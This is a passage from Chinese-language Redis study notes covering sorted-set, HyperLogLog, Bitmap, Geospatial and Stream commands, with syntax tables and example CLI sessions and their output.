<td style="text-align:left">ZRANGE 查询结果结果存储在目标键dst 中</td>
</tr>
<tr>
<td style="text-align:left">ZMSCORE</td>
<td style="text-align:left"><strong>ZMSCORE</strong> <em>key</em> member [member …]</td>
<td style="text-align:left">6.2.0</td>
<td style="text-align:left">查</td>
<td style="text-align:left">查询指定成员关联的分数<br>对于排序集中不存在的每个成员，返回一个 nil 值。</td>
</tr>
<tr>
<td style="text-align:left">ZINTERCARD</td>
<td style="text-align:left"><strong>ZINTERCARD</strong> numkeys <em>key [key …]</em> [<strong>LIMIT</strong> limit]</td>
<td style="text-align:left">7.0.0</td>
<td style="text-align:left">集合：交</td>
<td style="text-align:left">返回交集元素总量<br> [LIMIT limit]：默认为 0，表示无限制。<br>如果交集元素总量在计算过程中达到极限，算法将退出并将limit 作为交集总量<br><code>ZINTERCARD 2 zset1 zset2 LIMIT 1</code>:   <code>返回 1</code></td>
</tr>
<tr>
<td style="text-align:left">ZMPOP</td>
<td style="text-align:left"><strong>ZMPOP</strong> numkeys <em>key [key …]</em> &lt;<strong>MIN | MAX</strong>&gt; [<strong>COUNT</strong> count]</td>
<td style="text-align:left">7.0.0</td>
<td style="text-align:left">删</td>
<td style="text-align:left"><code>从多个key，弹出多个成员</code><br>从提供的键名列表中的第一个非空排序集中弹出一个或多个成员</td>
</tr>
<tr>
<td style="text-align:left">BZMPOP</td>
<td style="text-align:left"><strong>BZMPOP</strong> timeout numkeys <em>key [key …]</em> &lt;<strong>MIN | MAX&gt;</strong> [<strong>COUNT</strong> count]</td>
<td style="text-align:left">7.0.0</td>
<td style="text-align:left">删</td>
<td style="text-align:left"><code> 从多个key，弹出多个成员</code><br>有序集合中存在数据时返回，不存在时阻塞等待。<br>timeout：double数，时间单位为秒，设置为0时无期限等待</td>
</tr>
</tbody>
</table>
<blockquote>
<p>6.2.0之后已被弃用，被合并到ZRANGE</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>ZREVRANGE</strong>  <em>key</em> start stop [<strong>WITHSCORES</strong>]</td>
<td style="text-align:left">查</td>
<td style="text-align:left">按照<strong>分值降序</strong>后，返回有序集合中指定<strong>index</strong>范围的元素</td>
</tr>
<tr>
<td style="text-align:left"><span id="ORDER_ZRANGEBYLEX"><strong>ZRANGEBYLEX</strong> <em>key</em> min max [<strong>LIMIT</strong> offset count]</span></td>
<td style="text-align:left">查</td>
<td style="text-align:left">该命令返回有序集合中指定<strong>字典</strong>范围内的元素<br>① 当排序集中的所有元素<strong>以相同的分数</strong>插入时，使用字典顺序，<br>② 此命令返回排序集中的所有元素在 key 处，其值介于 min 和 max 之间。<br>③ 如果排序集中的元素具有不同的分数，则返回的元素是未指定的<br><code> ZRANGEBYLEX  hackers - +</code> <br><code> ZRANGEBYLEX  hackers - + LIMIT 2 3</code>  <br><code>ZRANGEBYLEX  hackers [A [Z</code>：包含<br><code>ZRANGEBYLEX  hackers (A (Z</code>：不包含</td>
</tr>
<tr>
<td style="text-align:left"><strong>ZREVRANGEBYLEX</strong> <em>key</em> max min [<strong>LIMIT</strong> offset count]</td>
<td style="text-align:left">查</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><strong>ZRANGEBYSCORE</strong> <em>key</em> min max [<strong>WITHSCORES</strong>] [<strong>LIMIT</strong> offset count]</td>
<td style="text-align:left">查</td>
<td style="text-align:left">按照<strong>分值降序</strong>后，返回有序集合中指定分值范围的元素<br>举例：<code>zrangebyscore hackers -inf 1950</code><br>==-inf==: 表示负无穷 <strong>infinity</strong> [ɪnˈfɪnəti]</td>
</tr>
<tr>
<td style="text-align:left"><strong>ZREVRANGEBYSCORE</strong> <em>key</em> max min [<strong>WITHSCORES</strong>] [<strong>LIMIT</strong> offset count]</td>
<td style="text-align:left">查</td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
<h1>HyperLogLogs（基数统计）</h1>
<blockquote>
<p>Redis 2.8.9 版本更新了 Hyperloglog 数据结构</p>
</blockquote>
<ul>
<li>
<p><strong>什么是基数？</strong></p>
<p>举个例子，A = {1, 2, 3, 4, 5}， B = {3, 5, 6, 7, 9}；那么基数（不重复的元素）= 1, 2, 4, 6, 7, 9； （允许容错，即可以接受一定误差）</p>
</li>
<li>
<p><strong>HyperLogLogs 基数统计用来解决什么问题</strong>？</p>
<p>这个结构可以非常省内存的去统计各种计数，比如注册 IP 数、每日访问 IP 数、页面实时UV、在线用户数，共同好友数等。</p>
</li>
<li>
<p><strong>它的优势体现在哪</strong>？</p>
<p>一个大型的网站，每天 IP 比如有 100 万，粗算一个 IP 消耗 15 字节，那么 100 万个 IP 就是 15M。而 HyperLogLog 在 Redis 中每个键占用的内容都是 12K，理论存储近似接近 2^64 个值，不管存储的内容是什么，它一个基于基数估算的算法，只能比较准确的估算出基数，可以使用少量固定的内存去存储并识别集合中的唯一元素。而且这个估算的基数并不一定准确，是一个带有 0.81% 标准错误的近似值（对于可以接受一定容错的业务场景，比如IP数统计，UV等，是可以忽略不计的）</p>
</li>
<li>
<p><strong>相关命令使用</strong></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># PFADD key [element [element ...]]</span>
<span class="token operator">&gt;</span> PFADD key1 a b c d e f g h i	<span class="token comment"># 创建第一组元素</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>

<span class="token comment"># 统计元素的基数数量</span>
<span class="token comment"># PFCOUNT key [key ...]</span>
<span class="token operator">&gt;</span> PFCOUNT key1					
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">9</span>

<span class="token comment"># 创建第二组元素</span>
<span class="token operator">&gt;</span> PFADD key2 c j k l m e g a		
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token operator">&gt;</span> PFCOUNT key2
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">8</span>

<span class="token comment"># 合并两组：key1 key2 -&gt; key3 并集</span>
<span class="token comment"># PFMERGE destkey sourcekey [sourcekey ...]</span>
<span class="token operator">&gt;</span> PFMERGE key3 key1 key2			
OK
<span class="token operator">&gt;</span> pfcount key3
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">13</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h1>Bitmap （位存储）</h1>
<blockquote>
<p>Bitmap 即位图数据结构，都是操作二进制位来进行记录，只有0 和 1 两个状态。</p>
</blockquote>
<ul>
<li>
<p><strong>用来解决什么问题</strong></p>
<p>比如：统计用户信息，活跃，不活跃； 登录，未登录；打卡，不打卡； <strong>两个状态的，都可以使用 Bitmaps</strong>！</p>
<p>如果存储一年的打卡状态需要多少内存呢？ 365 天 = 365 bit 1字节 = 8bit 46 个字节左右</p>
</li>
<li>
<p><strong>相关命令使用</strong></p>
<p>使用bitmap 来记录 周一到周日的打卡！ 周一：1 周二：0 周三：0 周四：1 …</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># SETBIT key offset value</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">0</span> <span class="token number">1</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">1</span> <span class="token number">1</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">2</span> <span class="token number">0</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">3</span> <span class="token number">1</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">4</span> <span class="token number">0</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">5</span> <span class="token number">0</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span>
<span class="token operator">&gt;</span> setbit sign <span class="token number">6</span> <span class="token number">1</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看某一天是否有打卡</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># GETBIT key offset</span>
<span class="token operator">&gt;</span> getbit sign <span class="token number">3</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>
<span class="token operator">&gt;</span> getbit sign <span class="token number">5</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>统计操作，统计 打卡的天数</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># BITCOUNT key [start end [BYTE | BIT]]</span>
<span class="token comment"># BITCOUNT 统计的是二进制后的数据</span>
<span class="token operator">&gt;</span> bitcount sign <span class="token comment"># 统计这周的打卡记录，就可以看到是否有全勤！</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">3</span>


<span class="token comment"># 111001101001100010101111</span>
<span class="token operator">&gt;</span> SET <span class="token builtin class-name">test</span> 谳
OK
<span class="token operator">&gt;</span> BITCOUNT <span class="token builtin class-name">test</span>
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<ol>
<li>
<p>GETBIT key offset</p>
</li>
<li>
<p>SETBIT key offset value</p>
</li>
<li>
<p>BITCOUNT key [start end [BYTE | BIT]]</p>
</li>
<li>
<p>BITOP operation destkey key [key …] ： 在多个键(包含字符串值)之间执行位操作，并将结果存储在目标键中</p>
<pre class="line-numbers language-none"><code class="language-none">BITOP AND destkey srckey1 srckey2 srckey3 ... srckeyN
BITOP OR destkey srckey1 srckey2 srckey3 ... srckeyN
BITOP XOR destkey srckey1 srckey2 srckey3 ... srckeyN
BITOP NOT destkey srckey<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>BITPOS key bit [start [end [BYTE | BIT]]]   返回字符串中第一个位设置为1或0的位置</p>
</li>
</ol>
<h1>Geospatial (地理位置)</h1>
<blockquote>
<p>这个功能可以推算地理位置的信息: 两地之间的距离, 方圆几里的人</p>
<ul>
<li>有效的经度从-180度到180度。</li>
<li>有效的纬度从-85.05112878度到85.05112878度。</li>
</ul>
</blockquote>
<h2 id="GEOADD：添加地理位置">GEOADD：添加地理位置</h2>
<p><strong>GEOADD</strong> key [NX | XX] [CH] <font color="blue">longitude latitude member </font> <font color="green">[longitude<br>
latitude member …]</font></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEOADD china:city <span class="token number">118.76</span> <span class="token number">32.04</span> nanjing <span class="token number">112.55</span> <span class="token number">37.86</span> taiyuan <span class="token number">123.43</span> <span class="token number">41.80</span> shenyang
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">3</span>
<span class="token operator">&gt;</span> GEOADD china:city <span class="token number">144.05</span> <span class="token number">22.52</span> shengzhen <span class="token number">120.16</span> <span class="token number">30.24</span> hangzhou <span class="token number">108.96</span> <span class="token number">34.26</span> xian
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>规则</strong></p>
<p>两级无法直接添加，我们一般会下载城市数据(这个网址可以查询 GEO： <a href="http://www.jsons.cn/lngcode">http://www.jsons.cn/lngcode</a>)！</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 当坐标位置超出上述指定范围时，该命令将会返回一个错误。</span>
<span class="token operator">&gt;</span> GEOADD china:city <span class="token number">39.90</span> <span class="token number">116.40</span> beijin
<span class="token punctuation">(</span>error<span class="token punctuation">)</span> ERR invalid longitude,latitude pair <span class="token number">39.900000</span>,116.400000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230207154102639-1678135967819-87.png" alt="image-20230207154102639"></p>
<blockquote>
<p>存储：将二维的经纬度转换为一维的HASH 值</p>
</blockquote>
<h2 id="GEOPOS：获取指定的成员的经度和纬度">GEOPOS：获取指定的成员的经度和纬度</h2>
<p>获得当前定位, 一定是一个坐标值</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEOPOS china:city taiyuan nanjing
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"112.54999905824661255"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"37.86000073876942196"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"118.75999957323074341"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"32.03999960287850968"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="GEODIST：计算两点之间的距离">GEODIST：计算两点之间的距离</h2>
<p><strong>GEODIST</strong> key member1 member2  [M | KM | FT | MI]</p>
<ul>
<li>m</li>
<li>km</li>
<li>mi 英里</li>
<li>ft 英尺</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEODIST china:city taiyuan shenyang KM
<span class="token string">"1026.4391"</span>

<span class="token comment"># 位置不存在，返回为空</span>
<span class="token operator">&gt;</span> GEODIST china:city chengdou shenyang KM
<span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="GEOHASH：-该命令返回11个字符的HASH字符串">GEOHASH： 该命令返回11个字符的HASH字符串</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEOHASH china:city taiyuan shenyang
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"ww8p3hhqmp0"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"wxrvb9qyxk0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="GEOSEARCH：地理位置查询">GEOSEARCH：地理位置查询</h2>
<blockquote>
<p>版本6.2.0 之后新增</p>
</blockquote>
<p><strong>GEOSEARCH</strong> key <font color="blue">&lt;<strong>FROMMEMBER</strong> member | <strong>FROMLONLAT</strong> longitude latitude&gt;</font><br>
<font color="green">&lt;<strong>BYRADIUS</strong> radius &lt;M | KM | FT | MI&gt; | BYBOX width height &lt;M | KM |<br>
FT | MI&gt;&gt;</font>  <strong>[ASC | DESC]</strong> <font color="blue"> [<strong>COUNT</strong> count [<strong>ANY</strong>]]</font> [WITHCOORD] [<strong>WITHDIST</strong>]<br>
[<strong>WITHHASH</strong>]</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS <span class="token number">10000</span> KM 
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"nanjing"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"taiyuan"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"shenyang"</span>

<span class="token operator">&gt;</span> GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS <span class="token number">10000</span> KM WITHDIST
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"nanjing"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"0.0000"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"taiyuan"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"859.5256"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"shenyang"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1161.7864"</span>
   
<span class="token operator">&gt;</span> GEOSEARCH china:city FROMMEMBER nanjing BYRADIUS <span class="token number">10000</span> KM WITHDIST WITHCOORD
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"nanjing"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"0.0000"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"118.75999957323074341"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"32.03999960287850968"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"taiyuan"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"859.5256"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"112.54999905824661255"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"37.86000073876942196"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"shenyang"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1161.7864"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"123.42999905347824097"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"41.79999919077864234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="GEOSEARCHSTORE">GEOSEARCHSTORE</h2>
<p><strong>GEOSEARCHSTORE</strong> destination source  <font color="blue">&lt;<strong>FROMMEMBER</strong> member | <strong>FROMLONLAT</strong> longitude latitude&gt;</font><br>
<font color="green">&lt;<strong>BYRADIUS</strong> radius &lt;M | KM | FT | MI&gt; | BYBOX width height &lt;M | KM |<br>
FT | MI&gt;&gt;</font>  <strong>[ASC | DESC]</strong> <font color="blue"> [<strong>COUNT</strong> count [<strong>ANY</strong>]]</font> [<strong>STOREDIST</strong>]</p>
<p>此命令类似于<code>GEOSEARCH</code>，但将结果存储在目标键中。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEOSEARCHSTORE <span class="token builtin class-name">test</span> china:city FROMMEMBER nanjing BYRADIUS <span class="token number">10000</span> KM
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230207161213311-1678135967819-89.png" alt="image-20230207161213311"></p>
<h2 id="GEORADIUS：获得所有附近的人的地址-定位-通过半径来查询（6-2-0之后弃用）">GEORADIUS：获得所有附近的人的地址, 定位, 通过半径来查询（6.2.0之后弃用）</h2>
<blockquote>
<p>从Redis版本6.2.0开始，此命令被认为已弃用。可将其替换为<code>GEOSEARCH</code>和<code>GEOSEARCHSTORE</code>，并使用<code>BYRADIUS</code>参数</p>
</blockquote>
<p><strong>GEORADIUS</strong> key longitude latitude radius  <strong>&lt;M | KM | FT | MI&gt;</strong><br>
[<strong>WITHCOORD</strong>] [<strong>WITHDIST</strong>] [<strong>WITHHASH</strong>] [<strong>COUNT</strong> count [<strong>ANY</strong>]] [<strong>ASC</strong> | <strong>DESC</strong>]<br>
[<strong>STORE</strong> key] [<strong>STOREDIST</strong> key]</p>
<ul>
<li><strong>WITHDIST</strong> : 返回距离</li>
<li><strong>WITHCOORD</strong>：返回坐标</li>
<li><strong>WITHHASH</strong>：返回坐标的HASH值（ZSET的SCORE值）</li>
<li><strong>COUNT</strong> count：显示结果的数量</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 以 100,30 这个坐标为中心, 寻找半径为1000km的城市</span>
<span class="token operator">&gt;</span> GEORADIUS china:city <span class="token number">110</span> <span class="token number">30</span> <span class="token number">1000</span> km			
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"xian"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"hangzhou"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"nanjing"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"taiyuan"</span>
<span class="token operator">&gt;</span> GEORADIUS china:city <span class="token number">110</span> <span class="token number">30</span> <span class="token number">500</span> km
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"xian"</span>
<span class="token operator">&gt;</span> GEORADIUS china:city <span class="token number">110</span> <span class="token number">30</span> <span class="token number">500</span> km WITHDIST
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"xian"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"483.8340"</span>
<span class="token operator">&gt;</span> GEORADIUS china:city <span class="token number">110</span> <span class="token number">30</span> <span class="token number">1000</span> km WITHCOORD WITHDIST count <span class="token number">2</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"xian"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"483.8340"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"108.96000176668167114"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"34.25999964418929977"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"nanjing"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"864.9816"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"118.75999957323074341"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"32.03999960287850968"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="GEORADIUSBYMEMBER：-显示与指定成员一定半径范围内的其他成员（6-2-0之后弃用）">GEORADIUSBYMEMBER： 显示与指定成员一定半径范围内的其他成员（6.2.0之后弃用）</h2>
<blockquote>
<p>从Redis版本6.2.0开始，此命令被认为已弃用。 可将其替换为<code>GEOSEARCH</code>和<code>GEOSEARCHSTORE</code>，并使用<code>BYRADIUS</code>和<code>FROMMEMBER</code>参数</p>
</blockquote>
<p><strong>GEORADIUSBYMEMBER</strong> key member radius <strong>&lt;M | KM | FT | MI&gt;</strong> [<strong>WITHCOORD</strong>]<br>
[<strong>WITHDIST</strong>] [<strong>WITHHASH</strong>] [<strong>COUNT</strong> count [<strong>ANY</strong>]] [<strong>ASC</strong> | <strong>DESC</strong>] [<strong>STORE</strong> key]<br>
[<strong>STOREDIST</strong> key]</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> GEORADIUSBYMEMBER china:city taiyuan <span class="token number">1000</span> km
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"nanjing"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"taiyuan"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"xian"</span>
<span class="token operator">&gt;</span> GEORADIUSBYMEMBER china:city taiyuan <span class="token number">1000</span> km withcoord WITHDIST count <span class="token number">2</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"taiyuan"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"0.0000"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"112.54999905824661255"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"37.86000073876942196"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"xian"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"514.2264"</span>
   <span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"108.96000176668167114"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"34.25999964418929977"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Redis Stream</h1>
<p>Redis Stream 是一种数据结构，其作用类似于<code>an append-only log</code>。您可以使用流实时记录和同步事件。</p>
<p>Redis Stream 用例的示例包括：</p>
<ul>
<li>事件溯源（例如，跟踪用户操作、点击等）</li>
<li>传感器监控（例如，现场设备的读数）</li>
<li>通知（例如，将每个用户的通知记录存储在单独的流中）</li>
</ul>
<p>Redis 为每个流条目生成一个唯一的 ID。您可以使用这些 ID 稍后检索其关联条目或读取和处理流中的所有后续条</p>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th>使用</th>
<th>功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="#STREAM_XADD">XADD</a></td>
<td></td>
<td>增</td>
<td style="text-align:left">唯一可以将数据添加到流的 Redis 命令</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XRANGE">XRANGE</a>/ <a href="#STREAM_XREVRANGE">XREVRANGE</a></td>
<td></td>
<td>查</td>
<td style="text-align:left">返回流中的一段元素</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XREAD">XREAD</a></td>
<td></td>
<td>查</td>
<td style="text-align:left">从一个或多个流中读取数据，只返回 ID 大于调用者报告的最后接收到的 ID 的条目</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XTRIM">XTRIM</a></td>
<td><strong>XTRIM</strong> <em>key</em> &lt;MAXLEN |MINID&gt; [= |~] threshold [LIMIT count]</td>
<td>删</td>
<td style="text-align:left">将流修剪到 (如果传入’~'，则大约) 某个大小</td>
</tr>
<tr>
<td style="text-align:left">XDEL</td>
<td>XDEL <em>key</em> id [id …]</td>
<td></td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XINFO">XINFO</a></td>
<td>1. <strong>XINFO STREAM</strong> key [FULL [COUNT count]]<br>2. <strong>XINFO GROUPS</strong> key<br>3. <strong>XINFO CONSUMERS</strong> key groupname <br></td>
<td>查</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">XLEN</td>
<td>XLEN key</td>
<td>查</td>
<td style="text-align:left">返回流中的条目数</td>
</tr>
<tr>
<td style="text-align:left">XSETID</td>
<td><strong>XSETID</strong> key last-id  [<strong>ENTRIESADDED</strong> entries_added]  [<strong>MAXDELETEDID</strong> max_deleted_entry_id]</td>
<td>改</td>
<td style="text-align:left">XSETID 命令是一个内部命令。 Redis 主服务器使用它来复制最后交付的流 ID。</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td></td>
<td></td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
<p>消息分组</p>
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th>使用</th>
<th>功能</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a href="#STREAM_XGROUP_CREATE">XGROUP CREATE</a></td>
<td><strong>XGROUP CREATE</strong> key groupname <font color="blue"> &lt;<strong>id |$</strong> &gt; </font> <font color="green">[<strong>MKSTREAM</strong>]</font> <strong>[ENTRIESREAD entries_read]</strong></td>
<td>增</td>
<td style="text-align:left">创建消费者组</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XGROUP_CREATECONSUMER">XGROUP CREATECONSUMER</a></td>
<td><strong>XGROUP CREATECONSUMER</strong> key groupname consumername</td>
<td>增</td>
<td style="text-align:left">在消费者组中创建消费者</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XGROUP_DELCONSUMER">XGROUP DELCONSUMER</a></td>
<td><strong>XGROUP DELCONSUMER</strong> key groupname consumername</td>
<td>删</td>
<td style="text-align:left">删除消费者</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XGROUP_DESTROY">XGROUP DESTROY</a></td>
<td><strong>XGROUP DESTROY</strong> key groupname</td>
<td>删</td>
<td style="text-align:left">消费者组</td>
</tr>
<tr>
